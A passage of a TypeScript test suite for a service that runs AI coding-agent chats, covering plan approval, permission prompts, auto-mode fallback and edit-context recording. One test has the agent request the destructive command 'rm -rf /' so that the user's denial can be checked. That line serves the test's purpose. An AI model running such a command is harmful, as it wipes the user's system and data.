      await service.sendToChat(chat.id, 'plan it')
      const decision = agent().ask('ExitPlanMode', { plan: '# Do the thing' })
      await service.answerPermission(await waitForRequest(events), 'allow')
      await decision
      agent().emit(resultMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })

      modeAnswer = refuseAuto('auto mode is unavailable for your plan')
      await service.sendToChat(chat.id, 'carry on')

      expect(service.listChats(workspaceId)[0]?.workingMode).toBe('acceptEdits')
      expect(events.map((announced) => announced.event)).toContainEqual({
        type: 'auto_mode_unavailable',
        reason: 'auto mode is unavailable for your plan',
        fallback: 'acceptEdits'
      })
    })

    /*
     * The agent may call the plan tool without having been asked to plan.
     * Handing over to `acceptEdits` there would let it raise a conversation the
     * user set to ask first, by asking once — so outside planning, approving
     * leaves the working mode where the user put it.
     */
    it('keeps asking first when a plan arrives outside planning', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      // A new conversation starts out planning; this one is about the mode it falls back to.
      await service.setChatPlanMode(chat.id, false)
      await service.sendToChat(chat.id, 'just do it')

      const decision = agent().ask('ExitPlanMode', { plan: 'a plan' })
      await service.answerPermission(await waitForRequest(events), 'allow')

      await expect(decision).resolves.toMatchObject({
        updatedPermissions: [{ type: 'setMode', mode: 'default', destination: 'session' }]
      })
      expect(service.listChats(workspaceId)[0]?.workingMode).toBe('default')
    })

    /*
     * The user may rewrite the plan before approving it. The agent then works
     * from the words it was approved with, not the ones it wrote — which rides
     * the reply that releases the call, since nothing else reaches the tool.
     */
    it('approves the plan the user rewrote, and hands the agent those words', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatPlanMode(chat.id, true)
      await service.sendToChat(chat.id, 'plan it')

      const decision = agent().ask('ExitPlanMode', { plan: '# The agent wrote this' })
      await service.answerPermission(
        await waitForRequest(events),
        'allow',
        undefined,
        '  # The user wrote this instead  '
      )

      await expect(decision).resolves.toMatchObject({
        behavior: 'allow',
        updatedInput: { plan: '# The user wrote this instead' }
      })
      expect(service.listChats(workspaceId)[0]?.planMode).toBe(false)
    })

    // The log has to say what the agent was actually told to do.
    it('writes the rewritten plan into the log', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatPlanMode(chat.id, true)
      await service.sendToChat(chat.id, 'plan it')

      void agent().ask('ExitPlanMode', { plan: '# The agent wrote this' })
      await service.answerPermission(
        await waitForRequest(events),
        'allow',
        undefined,
        '# The user wrote this instead'
      )

      await vi.waitFor(async () => {
        const history = await service.chatHistory(chat.id)
        expect(history.at(-1)).toMatchObject({
          role: 'agent',
          event: { type: 'plan_edited', plan: '# The user wrote this instead' }
        })
      })
    })

    // The tool's input is an open object, and replacing it whole would drop
    // whatever else the agent put there.
    it('keeps the rest of the tool input when the plan is rewritten', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatPlanMode(chat.id, true)
      await service.sendToChat(chat.id, 'plan it')

      const decision = agent().ask('ExitPlanMode', {
        plan: '# The agent wrote this',
        allowedPrompts: [{ tool: 'Bash', prompt: 'run tests' }]
      })
      await service.answerPermission(await waitForRequest(events), 'allow', undefined, '# Mine')

      await expect(decision).resolves.toMatchObject({
        updatedInput: { plan: '# Mine', allowedPrompts: [{ tool: 'Bash', prompt: 'run tests' }] }
      })
    })

    it('still rewrites the plan when the tool input was not an object', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatPlanMode(chat.id, true)
      await service.sendToChat(chat.id, 'plan it')

      const decision = agent().ask('ExitPlanMode', 'not an object')
      await service.answerPermission(await waitForRequest(events), 'allow', undefined, '# Mine')

      await expect(decision).resolves.toMatchObject({ updatedInput: { plan: '# Mine' } })
    })

    it('approves the plan as written when nothing was changed', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatPlanMode(chat.id, true)
      await service.sendToChat(chat.id, 'plan it')

      const decision = agent().ask('ExitPlanMode', { plan: '# As written' })
      await service.answerPermission(await waitForRequest(events), 'allow', undefined, '   ')

      await expect(decision).resolves.not.toHaveProperty('updatedInput.plan', '')
      await expect(decision).resolves.toMatchObject({
        updatedInput: { plan: '# As written' }
      })
    })

    // A tool's arguments are not the user's to change by this route: only the
    // plan is, and a rewritten one sent for anything else is ignored.
    it('ignores a rewritten plan sent with any other tool', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'go')

      const decision = agent().ask('Bash', { command: 'ls' })
      await service.answerPermission(
        await waitForRequest(events),
        'allow',
        undefined,
        '# Not a plan'
      )

      await expect(decision).resolves.toMatchObject({ updatedInput: { command: 'ls' } })
    })

    // The stored half is the one that outlived the session and made a
    // conversation revert to planning on its next turn.
    it('writes the end of planning to disk, not only to the session', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatPlanMode(chat.id, true)
      await service.sendToChat(chat.id, 'plan it')

      void agent().ask('ExitPlanMode', { plan: 'a plan' })
      await service.answerPermission(await waitForRequest(events), 'allow')

      const stored: unknown = JSON.parse(await readFile(join(dir, 'state.json'), 'utf8'))
      expect(stored).toMatchObject({ chats: [{ id: chat.id, planMode: false }] })
    })

    /*
     * The way the whole feature was silently switched off once already.
     *
     * A standing "always" on the plan tool is answered by `askPermission`
     * before it emits anything, so every later plan is approved with no
     * question, no dialog, no record that planning ended, and the agent goes
     * straight to editing. `config.ts` strips it on read; this stops it being
     * written in the first place.
     */
    it('never takes a standing answer for approving plans', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'plan it')

      const decision = agent().ask('ExitPlanMode', { plan: 'a plan' })
      await service.answerPermission(await waitForRequest(events), 'always')

      // Approved this once, as asked — but not for ever.
      await expect(decision).resolves.toMatchObject({ behavior: 'allow' })
      expect(service.getConfig().alwaysAllowedTools).toEqual([])
    })

    /*
     * The model leaves planning with the record. Asserted from inside the
     * agent's own continuation rather than after the answer, because the
     * ordering is the point: the reply is what releases the tool call, so a
     * model sent behind it would reach a session already editing files with
     * the model that wrote the plan.
     */
    it('puts a running session back on the coding model when a plan is approved', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatModel(chat.id, 'claude-sonnet-5')
      await service.setChatPlanModel(chat.id, 'claude-opus-5')
      await service.setChatPlanMode(chat.id, true)
      await service.sendToChat(chat.id, 'plan it')

      let onRelease: readonly (string | undefined)[] = []
      const decision = agent()
        .ask('ExitPlanMode', { plan: 'a plan' })
        .then((outcome) => {
          onRelease = [...agent().requestedModels()]
          return outcome
        })

      await service.answerPermission(await waitForRequest(events), 'allow')
      await decision

      // One push, not two: the session was started already planning, so it had
      // the plan model from the options it was built with.
      expect(onRelease).toEqual(['claude-sonnet-5'])
      expect(service.listChats(workspaceId)[0]?.planMode).toBe(false)
    })

    it('sends no model with an approved plan when the two jobs share one', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatPlanMode(chat.id, true)
      await service.sendToChat(chat.id, 'plan it')

      const decision = agent().ask('ExitPlanMode', { plan: 'a plan' })
      await service.answerPermission(await waitForRequest(events), 'allow')
      await decision

      expect(agent().requestedModels()).toEqual([])
    })

    // Every other approval leaves the mode exactly as it was. Only the plan
    // tool means "planning is over"; `Edit` means "yes, edit that file".
    it('changes no mode when an ordinary tool is approved', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatPlanMode(chat.id, true)
      await service.sendToChat(chat.id, 'edit it')

      const decision = agent().ask('Edit', { file_path: '/a.rb' })
      await service.answerPermission(await waitForRequest(events), 'allow')

      await expect(decision).resolves.not.toHaveProperty('updatedPermissions')
      expect(service.listChats(workspaceId)[0]?.planMode).toBe(true)
    })

    // What the plan dialog's "keep planning" sends. The agent reads a refusal's
    // message as instruction, so this is how a correction reaches it without
    // the turn having to end first.
    it('sends the words written with a refusal on to the agent', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'plan it')

      const decision = agent().ask('ExitPlanMode', { plan: 'a plan' })
      await service.answerPermission(
        await waitForRequest(events),
        'deny',
        '  Add a step for the tests  '
      )

      await expect(decision).resolves.toEqual({
        behavior: 'deny',
        message: 'Add a step for the tests'
      })
    })

    // Blank is not a message. Sent as one it would reach the agent as an empty
    // reason, which reads as a refusal with nothing behind it.
    it('falls back to its own wording when a refusal carries no words', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'delete it')

      const decision = agent().ask('Bash', { command: 'rm -rf /' })
      await service.answerPermission(await waitForRequest(events), 'deny', '   ')

      await expect(decision).resolves.toEqual({ behavior: 'deny', message: DENIED })
    })

    /*
     * How a window that missed the question finds it again.
     *
     * The event announcing a blocked tool goes out once. A window opened after
     * it — or one that switched workspace and came back, which clears what it
     * was holding — had no way to learn the agent was waiting, so the chat sat
     * on "working" for ever and the only answer nobody could give was the one
     * it needed. Seen for real: a plan waited half an hour that way.
     */
    it('can still say what the agent is blocked on after the event has gone', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'plan it')

      const decision = agent().ask('ExitPlanMode', { plan: 'a plan' })
      const requestId = await waitForRequest(events)

      // Everything the dialog needs to ask the question a second time.
      expect(service.pendingPermissions(chat.id)).toEqual([
        { requestId, toolName: 'ExitPlanMode', input: { plan: 'a plan' } }
      ])

      // And answering it still works, which is the point of recovering it.
      await service.answerPermission(requestId, 'allow')
      await expect(decision).resolves.toMatchObject({ behavior: 'allow' })
      expect(service.pendingPermissions(chat.id)).toEqual([])
    })

    it('says nothing for a chat whose agent is waiting on nothing', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      expect(service.pendingPermissions(chat.id)).toEqual([])
    })

    // Two workspaces run at once, and each window asks about its own.
    it('never hands one chat the question another is blocked on', async () => {
      const { service, projectId, workspaceId, events } = await withWorkspace()
      const first = await service.openChat(workspaceId)
      await service.sendToChat(first.id, 'edit it')

      void agent().ask('Edit', { file_path: '/a.rb' })
      await waitForRequest(events)

      const second = await service.createWorkspaceIn(projectId)
      const other = await service.openChat(second.id)

      expect(service.pendingPermissions(first.id)).toHaveLength(1)
      expect(service.pendingPermissions(other.id)).toEqual([])
    })

    it('refuses a chat that does not exist', async () => {
      const { service } = await withWorkspace()

      expect(() => service.pendingPermissions('chat-nothing')).toThrow(WorkspaceError)
    })

    /*
     * The lines around a change, read while the file still says what the edit
     * made it say.
     *
     * Looked up when the conversation is drawn they would be wrong: a later
     * edit shifts every line after it, so the context would surround wherever
     * that text has since ended up. Recorded once, it stays true.
     */
    it('records the lines around an edit that worked', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      const [workspace] = await service.listWorkspaces(service.listProjects()[0]?.id ?? '')
      await writeFile(
        join(workspace?.path ?? '', 'notes.txt'),
        'one\ntwo\nCHANGED\nfour\nfive\n',
        'utf8'
      )
      await service.sendToChat(chat.id, 'edit it')

      agent().emit(
        toolCallMessage('c-1', 'Edit', {
          file_path: 'notes.txt',
          old_string: 'three',
          new_string: 'CHANGED'
        })
      )
      agent().emit(toolResultMessage('c-1', true))

      await vi.waitFor(() => {
        expect(events.some((entry) => entry.event.type === 'change_context')).toBe(true)
      })

      const recorded = events.find((entry) => entry.event.type === 'change_context')
      expect(recorded?.event).toEqual({
        type: 'change_context',
        toolUseId: 'c-1',
        context: { before: ['one', 'two'], after: ['four', 'five'], startLine: 3 }
      })
    })

    // Nothing was written, so there is nothing to be around.
    it('records nothing for an edit that failed', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'edit it')

      agent().emit(
        toolCallMessage('c-1', 'Edit', {
          file_path: 'notes.txt',
          old_string: 'a',
          new_string: 'b'
        })
      )
      agent().emit(toolResultMessage('c-1', false))

      await vi.waitFor(() => {
        expect(events.some((entry) => entry.event.type === 'tool_result')).toBe(true)
      })
      expect(events.some((entry) => entry.event.type === 'change_context')).toBe(false)
    })

    /*
     * Nothing can draw a successful result's content — `AgentRow` returns null
     * when the call succeeded, and the fold renders only `tool_use` entries —
     * so the transcript was carrying a `Read` of three thousand lines in full,
     * to be parsed back on every open and dropped at render time.
     *
     * Both halves are asserted, because the fix is a distinction: the window
     * still gets the whole event, and only what is written down is bounded.
     */
    it('writes only the head of a long tool result, and streams the whole of it', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'read it')

      agent().emit(toolCallMessage('c-1', 'Read', { file_path: '/a.ts' }))
      agent().emit(toolResultMessage('c-1', true, 'x'.repeat(5000)))

      await vi.waitFor(async () => {
        await expect(service.chatHistory(chat.id)).resolves.toContainEqual(
          expect.objectContaining({
            role: 'agent',
            event: {
              type: 'tool_result',
              toolUseId: 'c-1',
              ok: true,
              content: 'x'.repeat(2000),
              truncated: true,
              // How long the whole was, so the count reads the same reopened.
              lineCount: 1,
              uuid: 'u-result'
            }
          })
        )
      })

      expect(events).toContainEqual(
        expect.objectContaining({
          event: {
            type: 'tool_result',
            toolUseId: 'c-1',
            ok: true,
            content: 'x'.repeat(5000),
            uuid: 'u-result'
          }
        })
      )
    })

    // A failure keeps everything, because its content is the whole of what the
    // failure says and the pane shortens it from the middle for reading.
    it('writes the whole of a long failure', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'read it')

      agent().emit(toolCallMessage('c-1', 'Read', { file_path: '/a.ts' }))
      agent().emit(toolResultMessage('c-1', false, 'x'.repeat(5000)))

      await vi.waitFor(async () => {
        await expect(service.chatHistory(chat.id)).resolves.toContainEqual(
          expect.objectContaining({
            role: 'agent',
            event: {
              type: 'tool_result',
              toolUseId: 'c-1',
              ok: false,
              content: 'x'.repeat(5000),
              uuid: 'u-result'
            }
          })
        )
      })
    })

    /*
     * A session that ends mid-tool leaves an edit nobody will ever answer for.
     *
     * Cleared with the session rather than left to accumulate — `pending` has
     * exactly this leak already, and one is enough. Seen from outside: the
     * workspace goes, a late result arrives for its edit, and nothing is
     * recorded for a file that is no longer there.
     */
    it('forgets an edit whose session was closed under it', async () => {
      const { service, projectId, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'edit it')

      const session = agent()
      session.emit(
        toolCallMessage('c-1', 'Edit', {
          file_path: 'notes.txt',
          old_string: 'a',
          new_string: 'b'
        })
      )
      await vi.waitFor(() => {
        expect(events.some((entry) => entry.event.type === 'tool_use')).toBe(true)
      })

      await service.removeWorkspaceById(workspaceId, { force: true })
      session.emit(toolResultMessage('c-1', true))

      await expect(service.listWorkspaces(projectId)).resolves.toHaveLength(0)
      expect(events.some((entry) => entry.event.type === 'change_context')).toBe(false)
    })

    /*
     * A turn stopped mid-edit produces no result, so the entry stayed for ever
     * — against the map's own comment promising it cannot grow. Bounded and
     * small, but the same shape as the question `abandonPermissions` withdraws.
     */
    it('forgets an edit whose turn was interrupted', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'edit it')

      const session = agent()
      session.emit(
        toolCallMessage('c-1', 'Edit', {
          file_path: 'notes.txt',
          old_string: 'a',
          new_string: 'b'
        })
      )
      await vi.waitFor(() => {
        expect(events.some((entry) => entry.event.type === 'tool_use')).toBe(true)
      })

      await service.interruptChat(chat.id)
      // Whatever arrives now belongs to a turn nobody is waiting on.
      session.emit(toolResultMessage('c-1', true))

      await vi.waitFor(() => {
        expect(events.some((entry) => entry.event.type === 'tool_result')).toBe(true)
      })
      expect(events.some((entry) => entry.event.type === 'change_context')).toBe(false)
    })

    // The context is a courtesy: the file may have moved on between the edit
    // and the read, and a wrong one would show a change among lines it never
    // touched.
    it('records nothing when the lines cannot be found', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'edit it')

      agent().emit(
        toolCallMessage('c-1', 'Edit', {
          file_path: 'missing.txt',
          old_string: 'a',
          new_string: 'b'
        })
      )
      agent().emit(toolResultMessage('c-1', true))

      await vi.waitFor(() => {
        expect(events.some((entry) => entry.event.type === 'tool_result')).toBe(true)
      })
      expect(events.some((entry) => entry.event.type === 'change_context')).toBe(false)
    })

    // The map is the whole service's, so closing one workspace must not take
    // another's edit with it. Two run at once by design.
    it('keeps an edit belonging to a workspace that is still open', async () => {
      const { service, projectId, workspaceId, events } = await withWorkspace()
      const closing = await service.openChat(workspaceId)
      await service.sendToChat(closing.id, 'edit it')
      agents[0]?.emit(
        toolCallMessage('c-closing', 'Edit', {
          file_path: 'notes.txt',
          old_string: 'a',
          new_string: 'b'
        })
      )
      // Awaited: the edit has to be on the books before its workspace goes, or
      // the closing has nothing of its own to forget and the test proves half
      // of what it claims.
      await vi.waitFor(() => {
        expect(events.some((entry) => entry.event.type === 'tool_use')).toBe(true)
      })

      const second = await service.createWorkspaceIn(projectId)
      const kept = await service.openChat(second.id)
      await writeFile(join(second.path, 'notes.txt'), 'one\nCHANGED\nthree\n', 'utf8')
      await service.sendToChat(kept.id, 'edit it')

      const session = agents[1]
      if (!session) throw new Error('the second session was not started')
      session.emit(
        toolCallMessage('c-1', 'Edit', {
          file_path: 'notes.txt',
          old_string: 'two',
          new_string: 'CHANGED'
        })
      )
      // Both of them, counted: waiting for "a tool call" would be satisfied by
      // the first one and the second might not be on the books yet.
      await vi.waitFor(() => {
        expect(events.filter((entry) => entry.event.type === 'tool_use')).toHaveLength(2)
      })

      await service.removeWorkspaceById(workspaceId, { force: true })
      session.emit(toolResultMessage('c-1', true))

      await vi.waitFor(() => {
        expect(events.some((entry) => entry.event.type === 'change_context')).toBe(true)
      })
    })

    // The file *is* the change, so there are no lines around it to show.
    it('records nothing for a file written whole', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'write it')

      agent().emit(
        toolCallMessage('c-1', 'Write', { file_path: 'notes.txt', content: 'all of it' })
      )
      agent().emit(toolResultMessage('c-1', true))

      await vi.waitFor(() => {
        expect(events.some((entry) => entry.event.type === 'tool_result')).toBe(true)
      })
      expect(events.some((entry) => entry.event.type === 'change_context')).toBe(false)
    })

    /*
     * The user's own answers are deliberately absent. A name here is approved
     * by the SDK before `canUseTool` is consulted, so an "always" handed over
     * at the start of a session could not be taken back until it ended —
     * unticking the tool in Settings changed nothing the agent was already
     * doing, and the call never reached us to be recorded.
     *
     * What the fake cannot show is that half: `ask()` calls `canUseTool`
     * directly, where the real SDK would not call it at all for a tool it
     * already holds. So the list itself is what is asserted, and the tests
     * above cover the standing answer still being honoured.
     */
    it('pre-approves the read-only tools and nothing else', async () => {
      const { service, workspaceId } = await withWorkspace()
      await service.updateConfig({
        alwaysAllowedTools: [{ toolName: 'Bash', ruleContent: null }]
      })
      const chat = await service.openChat(workspaceId)

      await service.sendToChat(chat.id, 'work')

      expect(agent().options().allowedTools).toEqual([...READ_ONLY_TOOLS])
    })

    // The workspace sits in `waiting_permission` while the question is open, so
    // something has to take it out again — otherwise the list keeps saying the
    // agent is blocked long after it was let through.
    it('puts the workspace back to work once the answer is given', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'edit it')

      void agent().ask('Edit')
      await service.answerPermission(await waitForRequest(events), 'allow')

      const [workspace] = await service.listWorkspaces('planner')
      expect(workspace?.status).toBe('running')
    })

    /*
     * Declining does **not** end the turn — this test used to say it did, and
     * asserted `idle` on the strength of it. The SDK's deny carries an
     * `interrupt` flag and `agent.ts` deliberately does not set it, so the
     * refusal reaches the model as a tool result and the same turn carries on.
     * Deny-with-feedback is the app's steering mechanism, and the plan dialog's
     * "keep planning" is exactly this path.
     *
     * So the workspace was drawn grey for the whole remainder of every turn
     * somebody steered — the state the list exists to get right, wrong at the
     * moment the agent is doing the most work. Nothing put it back either: no
     * agent event writes `running`.
     */
    it('leaves the workspace running when the answer is no', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'delete it')

      void agent().ask('Bash')
      await service.answerPermission(await waitForRequest(events), 'deny')

      const [workspace] = await service.listWorkspaces('planner')
      expect(workspace?.status).toBe('running')
      expect(service.listChats(workspaceId)[0]?.status).toBe('running')
    })

    // Self-correcting rather than a second thing to remember: the turn always
    // ends in a result, and that is what puts the status back.
    it('goes idle once the turn that survived the refusal ends', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'delete it')

      void agent().ask('Bash')
      await service.answerPermission(await waitForRequest(events), 'deny')
      agent().emit(resultMessage)

      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
      })
    })

    // Already answered, or the session it belonged to is gone.
    it('ignores an answer to a request nobody is waiting on', async () => {
      const { service } = await withWorkspace()

      await expect(service.answerPermission('r-nothing', 'allow')).resolves.toBeUndefined()
    })

    /*
     * A question used to outlive the turn that raised it: only an answer took
     * it out of the map, so stopping the turn instead of answering left it
     * there — and `pendingPermissions` hands it to whatever
     * window opens the conversation next. The cancelled card came back with
     * live buttons on it, and the composer with it, until the app restarted.
     *
     * The refusal is not `DENIED`: nobody declined anything, and the agent
     * reads that message as instruction.
     */
    it('lets go of a question the stopped turn will never answer', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'delete it')

      const decision = agent().ask('Bash', { command: 'rm -rf build' })
      await waitForRequest(events)

      await service.interruptChat(chat.id)

      await expect(decision).resolves.toMatchObject({ behavior: 'deny', message: ABANDONED })
      expect(service.pendingPermissions(chat.id)).toEqual([])
    })

    it('leaves the question another conversation is blocked on alone', async () => {
      const { service, projectId, workspaceId, events } = await withWorkspace()
      const first = await service.openChat(workspaceId)
      await service.sendToChat(first.id, 'edit it')

      const second = await service.createWorkspaceIn(projectId)
      const other = await service.openChat(second.id)
      await service.sendToChat(other.id, 'edit it too')

      void agents[0]?.ask('Edit')
      void agents[1]?.ask('Edit')
      await vi.waitFor(() => {
        expect(events.filter((entry) => entry.event.type === 'permission_request')).toHaveLength(2)
      })

      await service.interruptChat(first.id)

      expect(service.pendingPermissions(first.id)).toEqual([])
      expect(service.pendingPermissions(other.id)).toHaveLength(1)
    })

    // The turn can also end on its own while the question is open — the SDK
    // gives up on the tool call, and nothing would ever answer for it.
    it('withdraws a question the finished turn never answered', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'edit it')

      const decision = agent().ask('Edit')
      await waitForRequest(events)

      agent().emit(resultMessage)

      await expect(decision).resolves.toMatchObject({ behavior: 'deny' })
      expect(service.pendingPermissions(chat.id)).toEqual([])

      await vi.waitFor(async () => {
        const [workspace] = await service.listWorkspaces('planner')
        expect(workspace?.status).toBe('idle')
      })
    })

    it('withdraws it when the session dies with the question open', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'edit it')

      const decision = agent().ask('Edit')
      await waitForRequest(events)

      agent().finish(new Error('claude exited with code 1'))

      await expect(decision).resolves.toMatchObject({ behavior: 'deny' })
      expect(service.pendingPermissions(chat.id)).toEqual([])

      await vi.waitFor(async () => {
        const [workspace] = await service.listWorkspaces('planner')
        expect(workspace?.status).toBe('error')
      })
    })

    /*
     * An answer is also a write, and a write can fail. The question used to be
     * taken out of the map before the write was attempted, so a config file
     * that could not be written left the agent blocked on something nobody
     * could answer a second time: the window had dropped its copy, and
     * `pendingPermissions` had none left to hand back.
     */
    it('keeps the question askable when the answer cannot be saved', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'list it')

      const decision = agent().ask('Bash', { command: 'ls' })
      const requestId = await waitForRequest(events)

      // The config file becomes a directory, so the rename that finishes an
      // atomic write has nowhere to land.
      await rm(join(dir, 'config.json'), { force: true })
      await mkdir(join(dir, 'config.json'), { recursive: true })

      await expect(service.answerPermission(requestId, 'always')).rejects.toThrow()
      expect(service.pendingPermissions(chat.id)[0]?.requestId).toBe(requestId)

      // Answering it again works, which is the whole of the point: 'allow'
      // writes no config, so it gets through where 'always' could not.
      await service.answerPermission(requestId, 'allow')
      await expect(decision).resolves.toMatchObject({ behavior: 'allow' })
    })

    // The workspace is going, and with it the chat — so there is nothing left
    // to ask, and the answer has to be given here or not at all.
    it('lets go of the questions of a workspace being removed', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'edit it')

      const decision = agent().ask('Edit')
      await waitForRequest(events)

      await service.removeWorkspaceById(workspaceId, { force: true })

      await expect(decision).resolves.toMatchObject({ behavior: 'deny' })
    })
  })

  describe('the mode', () => {
    describe('auto', () => {
      it('reaches a session that is already running', async () => {
        const { service, workspaceId } = await withWorkspace()
        const chat = await service.openChat(workspaceId)
        // A new conversation starts out planning; this one is about the mode it falls back to.
        await service.setChatPlanMode(chat.id, false)
        await service.sendToChat(chat.id, 'work')

        await service.setChatWorkingMode(chat.id, 'auto')

        expect(agent().modes()).toContain('auto')
        expect(service.listChats(workspaceId)[0]?.workingMode).toBe('auto')
      })

      // Somebody has just asked for it, so the refusal is theirs to read, and
      // the record goes back to what it said rather than claiming auto.
      it('is refused with the reason, and the chat keeps its mode, when the session will not take it', async () => {
        const { service, workspaceId } = await withWorkspace()
        const chat = await service.openChat(workspaceId)
        // A new conversation starts out planning; this one is about the mode it falls back to.
        await service.setChatPlanMode(chat.id, false)
        await service.setChatWorkingMode(chat.id, 'acceptEdits')
        await service.sendToChat(chat.id, 'work')
        modeAnswer = refuseAuto('auto mode unavailable for this model')

        await expect(service.setChatWorkingMode(chat.id, 'auto')).rejects.toMatchObject({
          code: 'autoModeUnavailable',
          params: { chatId: chat.id, reason: 'auto mode unavailable for this model' }
        })
        expect(service.listChats(workspaceId)[0]?.workingMode).toBe('acceptEdits')
      })

      // A choice made while the refusal was on its way is newer than the one
      // refused, so the record keeps it rather than going back.
      it('keeps a mode chosen while auto mode was being refused', async () => {
        const { service, workspaceId } = await withWorkspace()
        const chat = await service.openChat(workspaceId)
        // A new conversation starts out planning; this one is about the mode it falls back to.
        await service.setChatPlanMode(chat.id, false)
        await service.sendToChat(chat.id, 'work')

        let refuse: (error: Error) => void = () => undefined
        modeAnswer = (mode) =>
          mode === 'auto'
            ? new Promise<void>((_resolve, reject) => {
                refuse = reject
              })
            : Promise.resolve()
        const choosing = service.setChatWorkingMode(chat.id, 'auto')
        await vi.waitFor(() => {
          expect(agent().modes()).toEqual(['auto'])
        })
        await service.setChatWorkingMode(chat.id, 'acceptEdits')
        refuse(new Error('auto mode unavailable for this model'))

        await expect(choosing).rejects.toMatchObject({ code: 'autoModeUnavailable' })
        expect(service.listChats(workspaceId)[0]?.workingMode).toBe('acceptEdits')
      })

      // Nobody is choosing at the moment a message goes, so there is nobody to
      // hand an error to: the chat drops to Manual, says so, and the message
      // still goes.
      it('falls back to Manual on a message when the session no longer takes it', async () => {
        const { service, workspaceId, events } = await withWorkspace()
        const chat = await service.openChat(workspaceId)
        // A new conversation starts out planning; this one is about the mode it falls back to.
        await service.setChatPlanMode(chat.id, false)
        await service.sendToChat(chat.id, 'work')
        await service.setChatWorkingMode(chat.id, 'auto')
        agent().emit(resultMessage)
        await vi.waitFor(() => {
          expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
        })

        modeAnswer = refuseAuto('auto mode disabled by settings')
        await service.sendToChat(chat.id, 'carry on')

        expect(service.listChats(workspaceId)[0]?.workingMode).toBe('default')
        expect(agent().sent).toContain('carry on')
        expect(agent().modes().at(-1)).toBe('default')
        expect(events.map((announced) => announced.event)).toContainEqual({
          type: 'auto_mode_unavailable',
          reason: 'auto mode disabled by settings',
          fallback: 'default'
        })
      })

      // Any other mode is the SDK's own, so a refusal of it is a fault rather
      // than something to fall back from.
      it('lets a refusal of any other mode go up as before', async () => {
        const { service, workspaceId } = await withWorkspace()
        const chat = await service.openChat(workspaceId)
        await service.sendToChat(chat.id, 'work')
        agent().emit(resultMessage)
        await vi.waitFor(() => {
          expect(service.listChats(workspaceId)[0]?.status).toBe('idle')
        })
        modeAnswer = () => Promise.reject(new Error('control channel closed'))

        await expect(service.sendToChat(chat.id, 'carry on')).rejects.toThrow(
          'control channel closed'
        )
        expect(service.listChats(workspaceId)[0]?.workingMode).toBe('default')
      })

      // Leaving a plan with the record already in auto is no one's fresh
      // choice of it either, so a refusal there falls back rather than fails.
      it('falls back when planning is turned off over a chat whose auto mode is refused', async () => {
        const { service, workspaceId, events } = await withWorkspace()
        const chat = await service.openChat(workspaceId)
        await service.setChatWorkingMode(chat.id, 'auto')
        await service.setChatPlanMode(chat.id, true)
        await service.sendToChat(chat.id, 'plan')
        modeAnswer = refuseAuto('auto mode is unavailable for your plan')

        await service.setChatPlanMode(chat.id, false)

        expect(service.listChats(workspaceId)[0]?.workingMode).toBe('default')
